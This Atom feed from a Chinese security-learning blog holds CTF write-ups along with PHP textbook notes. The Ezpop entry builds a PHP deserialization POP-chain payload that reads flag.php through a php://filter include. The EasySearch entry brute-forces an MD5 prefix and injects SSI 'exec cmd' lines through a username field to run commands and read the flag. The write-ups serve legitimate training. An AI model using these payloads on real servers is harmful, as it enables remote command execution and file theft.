<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Αιώνιος</title>
  
  <subtitle>The value of life lies not length of days, but in the use of we make of them.</subtitle>
  <link href="http://daweitech.github.io/atom.xml" rel="self"/>
  
  <link href="http://daweitech.github.io/"/>
  <updated>2021-09-04T07:40:04.348Z</updated>
  <id>http://daweitech.github.io/</id>
  
  <author>
    <name>宛若梦醒月明时</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>网鼎杯 2020 总决赛 Novel</title>
    <link href="http://daweitech.github.io/2021/09/04/buu/20/"/>
    <id>http://daweitech.github.io/2021/09/04/buu/20/</id>
    <published>2021-09-04T07:24:15.000Z</published>
    <updated>2021-09-04T07:40:04.348Z</updated>
    
    <content type="html"><![CDATA[<p>(<a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a>)</p><p>网鼎杯：</p><p><a href="https://www.cnblogs.com/W4nder/p/14078695.html">网鼎杯2020线下web - W4nder - 博客园 (cnblogs.com)</a></p><p><a href="https://mount4in.github.io/2020/12/08/2020%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEwriteup/">2020第二届网鼎杯半决赛Web题目writeup | Mount4in</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;(&lt;a href=&quot;https://www.cnblogs.com/karsa/p/12806945.html&quot;&gt;https://www.cnblogs.com/karsa/p/12806945.html&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;网鼎杯：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;h</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020 Ezpop</title>
    <link href="http://daweitech.github.io/2021/09/03/buu/19/"/>
    <id>http://daweitech.github.io/2021/09/03/buu/19/</id>
    <published>2021-09-03T07:48:25.000Z</published>
    <updated>2021-09-04T13:40:16.774Z</updated>
    
    <content type="html"><![CDATA[<p>借鉴博客</p><p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">MRCTF2020]Ezpop—序列化pop链_marsxu626的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a></p><p>这题主要是代码审计，还涉及到一个知识点：构造pop链</p><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来分而解析几个不同的类</p><p>1.Modifier类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;<span class="comment">//variable，变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个我在把文件放进seay审计系统里跑的时候就跑出了</p><p>include文件包含漏洞，而者也是我们最后要达成的目的：</p><p>利用文件包含漏洞和php伪协议来读取flag文件</p><p>这里还有魔法方法<strong>__invoke</strong> ，当脚本尝试将对象调用为函数时触发，所以在脚本中要把Modifier类调用为函数。</p><p>2.Show类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到了这里的_wakeup()函数，在反序列化时一定会首先调用其函数，过滤了不老少关键字，但是像filter://伪协议却没有过滤。</p><p>而_toString把类当作字符串时触发</p><p>所以得出wakeup方法可以触发tostring方法</p><p>3.Test类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有魔法方法：<strong>__get</strong> 从不可访问的属性中读取数据会触发<br>会返回function作为函数调用。</p><p>思路得出：</p><p>​        首先反序列化函数，触发Show类中的wakeup方法，wakeup方法做字符串处理，触发tosring方法，如果将str实例化为Test，因为Test类中不含source属性，所以调用get方法，将function实例化为Modifier类，即可触发其中invoke方法，最终调用文件包含函数，读取flag.php</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">$a-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">$b = <span class="keyword">new</span> Show($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3Ba%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A4%3A%22Read%22%3A1%3A%7Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p><img src="/2021/09/03/buu/19/image-20210904213507487.png" alt="image-20210904213507487"></p><p><img src="/2021/09/03/buu/19/image-20210904214001095.png" alt="image-20210904214001095"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;借鉴博客&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_43952190/article/details/106016260&quot;&gt;MRCTF2020]Ezpop—序列化pop链_marsxu626的博客-CSDN博客&lt;/a&gt;&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>PHP and MySQL Web Development(一)</title>
    <link href="http://daweitech.github.io/2021/09/03/php/1/"/>
    <id>http://daweitech.github.io/2021/09/03/php/1/</id>
    <published>2021-09-03T02:51:22.000Z</published>
    <updated>2021-09-04T07:31:12.242Z</updated>
    
    <content type="html"><![CDATA[<p> 从创建示例Web应用开始：Bob的汽车零部件商店</p><p>创建订单表单：</p><p>任何服务器端脚本语言最常见的应用场景是之一</p><p>1.1</p><p>就是处理HTML表单。</p><p>接下来程序清单1-1：order.html，商店基础HTML代码</p><p><img src="/2021/09/03/php/1/image-20210903110152375.png" alt="image-20210903110152375"></p><p>呈现画面</p><form action="processorder.php" method="post"><table style="border: 0px;"><tr style="background: #cccccc;">    <td style="width: 150px; text-align: center;">Item</td>    <td style="width: 15px; text-align: center;">Quantity</td></tr><tr>    <td>Tries</td>    <td><input type="text" name="tireqty" size="3" maxlength="3"></td></tr><tr>    <td>Oil</td>    <td><input type="text" name="oilqty" size="3" maxlength="3"></td></tr><tr>    <td>Spark Plugs</td>    <td><input type="text" name="sparkqty" size="3" maxlength="3"></td></tr><tr>    <td colspan="2" style="text-align" : center;"><input type="submit" value="Submit Order"></td>    </tr>    </table>    </form><p>注意：该表单的action属性被设置为能够处理客户订单的PHP脚本名称，后续会对该脚本进行增添。</p><p>一般地，actions属性就是用户点击提交按钮时将要载入的URL</p><p>用户在表单中输入的数据将按照method属性中指定的HTTP方法发送到这个URL，该方法是get（附加在URL的结尾）或者post（以单独的信息发送）。</p><p>1.2</p><p>表单的处理，需要创建在form标记的action属性中指定的处理脚本，该脚本为processorder.php，代码如下</p><p><img src="/2021/09/03/php/1/image-20210903110937097.png" alt="image-20210903110937097"></p><p>我们在h2处添加了php代码</p><p>这样我们看到php的echo输出语句同时，</p><p>在html页面点击Submit Order也会有类似内容显示</p><p><img src="/2021/09/03/php/1/image-20210903150404934.png" alt="image-20210903150404934"></p><p>请注意</p><p>我们所编写的PHP代码是如何嵌入到一个常见的HTML文件中的</p><p>通过浏览器，我们查看该HTML的源代码</p><p><img src="/2021/09/03/php/1/image-20210903150637332.png" alt="image-20210903150637332"></p><p>以上代码并没有显示原始的PHP语句</p><p>这是因为PHP解释器已经运行了该脚本，并且用该脚本的输出代替了脚本的本身。</p><p>也就是说，通过PHP，我们可以生成能在任何浏览器中查看的纯HTML，换一个意思理解，用户的浏览并不需要理解PHP。</p><p>此文件组成：</p><p>1.HTML 2.PHP标记 3.PHP语句 4.空格</p><p>1.3.1</p><p>PHP标记</p><?php    为开始，?><p>为结束</p><p>​        这样的标记称作PHP标记，可以告诉服务器PHP代码的开始和结束。</p><p>XML风格(建议使用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>简短风格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>1.3.2</p><p>PHP语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;;</span><br></pre></td></tr></table></figure><p>echo语句：将传递给其自身的字符串打印或者回显到浏览器</p><p>1.7.1</p><p>PHP的数据类型</p><p>1.整数    Integer</p><p>2.浮点数    Float</p><p>3.字符串    String</p><p>4.布尔    Boolean</p><p>5.数组    Array</p><p>6.对象    Object</p><p>附：三个特殊类型 NULL（空）、resource（资源）、</p><p>callable 。</p><p>1.7.2</p><p>类型强度</p><p>PHP是一种弱类型，或者动态型语言</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$total1 &#x3D; 0;</span><br><span class="line"></span><br><span class="line">$total2 &#x3D; 0.00;</span><br></pre></td></tr></table></figure><p>此时，$total1是一个整数类型的变量</p><p>而$total2是一个浮点类型的变量。</p><p>若添加以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$total2 &#x3D; &#39;Hello&#39;;</span><br></pre></td></tr></table></figure><p>则$total2是字符串类型的变量。</p><p>1.7.3</p><p>类型转换</p><p>1.7.4</p><p>可变变量</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 从创建示例Web应用开始：Bob的汽车零部件商店&lt;/p&gt;
&lt;p&gt;创建订单表单：&lt;/p&gt;
&lt;p&gt;任何服务器端脚本语言最常见的应用场景是之一&lt;/p&gt;
&lt;p&gt;1.1&lt;/p&gt;
&lt;p&gt;就是处理HTML表单。&lt;/p&gt;
&lt;p&gt;接下来程序清单1-1：order.html，商店基础HTML</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <link href="http://daweitech.github.io/2021/09/02/buu/18/"/>
    <id>http://daweitech.github.io/2021/09/02/buu/18/</id>
    <published>2021-09-02T11:56:57.000Z</published>
    <updated>2021-09-02T12:57:15.636Z</updated>
    
    <content type="html"><![CDATA[<p> 参考博客：</p><p><a href="https://blog.csdn.net/devilare/article/details/119351945">https://blog.csdn.net/devilare/article/details/119351945</a>    </p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)">https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)</a></p><p>打开后只有一个输入框</p><p>尝试了一下sql注入</p><p>只会出现一样的弹框</p><p><img src="/2021/09/02/buu/18/image-20210902195901927.png" alt="image-20210902195901927"></p><p>扫描目录后发现还有swp文件</p><p>访问得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">function get_hash()&#123;</span><br><span class="line">$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;</span><br><span class="line">$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times</span><br><span class="line">$content &#x3D; uniqid().$random;</span><br><span class="line">return sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">***</span><br><span class="line">    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin &#x3D; &#39;6d0bc1&#39;;</span><br><span class="line">        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text &#x3D; &#39;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;</span><br><span class="line">            ***</span><br><span class="line">***&#39;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>映入眼帘的就是hash函数</p><p>注意到登陆代码</p><p><img src="/2021/09/02/buu/18/image-20210902200408592.png" alt="image-20210902200408592"></p><p>​        解释起来，就是password必须hash加密后要等于6d0bc1，满足后就会输出script弹窗 </p><p>‘Welcome to manage system’</p><p><img src="/2021/09/02/buu/18/image-20210902200802654.png" alt="image-20210902200802654"></p><p>登录成功后会生成相应的shtml文件</p><p>开始解题</p><p>先得到脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line">string &#x3D; &#39;0123456789&#39;</span><br><span class="line">class BF(threading.Thread):</span><br><span class="line">    def __init__(self,left,right):</span><br><span class="line">        threading.Thread.__init__(self) #父类的构造方法</span><br><span class="line">        self.left &#x3D; left</span><br><span class="line">        self.right &#x3D; right</span><br><span class="line">    def run(self):</span><br><span class="line">        admin &#x3D; &#39;6d0bc1&#39;</span><br><span class="line">        for i in range(self.left,self.right):</span><br><span class="line">            s &#x3D; hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">            if s[:6] &#x3D;&#x3D; admin:</span><br><span class="line">                print i</span><br><span class="line">threads &#x3D; []</span><br><span class="line">thread_count &#x3D; 5</span><br><span class="line">for i in range(thread_count):</span><br><span class="line">    threads.append(BF(i*2000000, (i+1)*2000000))</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑完后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\#2020666</span><br><span class="line">\#2305004</span><br><span class="line">\#9162671</span><br></pre></td></tr></table></figure><p>选择其中一个密码登录</p><p>然后查看网络状态</p><p><img src="/2021/09/02/buu/18/image-20210902201334561.png" alt="image-20210902201334561"></p><p>用这里的路径访问下</p><p><img src="/2021/09/02/buu/18/image-20210902201420408.png" alt="image-20210902201420408"></p><p>看wp知道了后面用ssti模板注入</p><p>这里有一个知识点</p><p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用语法执行命令。</p><p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p><p>username成为注入点</p><!--#exec cmd="whoami"--><p><img src="/2021/09/02/buu/18/image-20210902201644511.png" alt="image-20210902201644511"></p><!--#exec cmd="ls"--><p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201754915.png" alt="image-20210902201754915"></p><!--#exec cmd="ls ../"-->  #看一下上层目录<p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201952167.png" alt="image-20210902201952167"></p><p>找到了</p><!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--><p><img src="/2021/09/02/buu/18/image-20210902202133502.png" alt="image-20210902202133502"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 参考博客：&lt;/p&gt;
